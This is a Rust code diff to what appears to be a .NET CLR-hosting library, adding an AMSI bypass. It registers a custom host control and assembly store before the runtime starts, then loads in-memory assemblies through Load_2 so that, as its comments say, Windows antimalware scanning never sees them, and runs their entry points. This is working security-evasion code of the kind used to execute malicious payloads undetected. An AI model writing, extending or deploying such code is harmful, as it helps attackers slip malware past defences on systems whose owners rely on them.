@@ -1,6 +1,6 @@
 use crate::primitives::{
-    ICLRMetaHost, ICLRRuntimeInfo, ICorRuntimeHost, _AppDomain, _MethodInfo, empty_variant_array,
-    wrap_method_arguments, RuntimeVersion, GUID, HRESULT,
+    AmsiBypassLoader, ICLRMetaHost, ICLRRuntimeHost, ICLRRuntimeInfo, ICorRuntimeHost, _AppDomain,
+    _MethodInfo, empty_variant_array, wrap_method_arguments, RuntimeVersion, GUID, HRESULT,
 };
 use std::ffi::c_void;
 use windows::Win32::System::Com::VARIANT;
@@ -21,6 +21,7 @@ pub struct ClrContext {
     pub host: *mut ICLRMetaHost,
     pub runtime_info: *mut ICLRRuntimeInfo,
     pub runtime_host: *mut ICorRuntimeHost,
+    pub clr_runtime_host: Option<*mut ICLRRuntimeHost>,
     pub app_domain: *mut _AppDomain,
 }
 
@@ -283,6 +284,7 @@ impl Clr {
             host,
             runtime_info,
             runtime_host,
+            clr_runtime_host: None,
             app_domain,
         });
 
@@ -302,6 +304,102 @@ impl Clr {
         let host: *mut ICLRMetaHost = ICLRMetaHost::new(create_interface)?;
 
         return Ok(host);
+    }
+
+    // ========================================================================
+    // AMSI Bypass methods - Load assemblies via Load_2 without AMSI scanning
+    // ========================================================================
+
+    /// Initialize the CLR context with AMSI bypass enabled
+    /// This sets up a custom IHostControl with IHostAssemblyStore
+    /// that intercepts assembly loading via Load_2
+    ///
+    /// IMPORTANT: Call this BEFORE the runtime starts!
+    pub fn get_context_with_amsi_bypass(
+        &mut self,
+        bypass_loader: &mut AmsiBypassLoader,
+    ) -> Result<&ClrContext, String> {
+        if self.context.is_some() {
+            return Err("Context already initialized. AMSI bypass must be set before runtime starts.".into());
+        }
+
+        let host = self.get_clr_host()?;
+        let runtime_info = unsafe { (*host).get_first_available_runtime(Some(self.version))? };
+
+        // Get ICLRRuntimeHost (not ICorRuntimeHost) - this has SetHostControl
+        let clr_runtime_host = unsafe { (*runtime_info).get_clr_runtime_host()? };
+
+        // Create and set our custom host control BEFORE starting the runtime
+        let host_control = bypass_loader.create_host_control();
+        unsafe { (*clr_runtime_host).set_host_control(host_control)? };
+
+        // Now start the runtime
+        unsafe {
+            if (*runtime_info).can_be_loaded()? && !(*runtime_info).has_started()? {
+                (*clr_runtime_host).start()?;
+            }
+        };
+
+        // Get the legacy runtime host for AppDomain access
+        let runtime_host = unsafe { (*runtime_info).get_runtime_host()? };
+        let app_domain = unsafe { (*runtime_host).get_default_domain()? };
+
+        self.context = Some(ClrContext {
+            has_started: true,
+            host,
+            runtime_info,
+            runtime_host,
+            clr_runtime_host: Some(clr_runtime_host),
+            app_domain,
+        });
+
+        Ok(self.context.as_ref().unwrap())
+    }
+
+    /// Run an assembly using AMSI bypass
+    /// 1. Register the assembly bytes with a custom identity
+    /// 2. Call Load_2(identity) - CLR asks our ProvideAssembly for bytes
+    /// 3. AMSI never sees the assembly because Load_2 is not instrumented!
+    pub fn run_with_amsi_bypass(
+        &mut self,
+        bypass_loader: &mut AmsiBypassLoader,
+        assembly_identity: &str,
+    ) -> Result<String, String> {
+        // Register the assembly bytes
+        bypass_loader.register_assembly(assembly_identity, self.contents.clone())?;
+
+        self.redirect_output()?;
+
+        let context = self.get_context_with_amsi_bypass(bypass_loader)?;
+
+        // Load using Load_2 with our custom identity
+        // The CLR will call our ProvideAssembly which returns the bytes via IStream
+        let assembly = unsafe { (*context.app_domain).load_library(assembly_identity)? };
+
+        unsafe { (*assembly).run_entrypoint(&self.arguments)? };
+
+        self.restore_output()?;
+
+        self.get_redirected_output()
+    }
+
+    /// Run an assembly using AMSI bypass without output redirection
+    pub fn run_with_amsi_bypass_no_redirect(
+        &mut self,
+        bypass_loader: &mut AmsiBypassLoader,
+        assembly_identity: &str,
+    ) -> Result<String, String> {
+        // Register the assembly bytes
+        bypass_loader.register_assembly(assembly_identity, self.contents.clone())?;
+
+        let context = self.get_context_with_amsi_bypass(bypass_loader)?;
+
+        // Load using Load_2 - AMSI bypass!
+        let assembly = unsafe { (*context.app_domain).load_library(assembly_identity)? };
+
+        unsafe { (*assembly).run_entrypoint(&self.arguments)? };
+
+        Ok("".to_string())
     }
 }
 
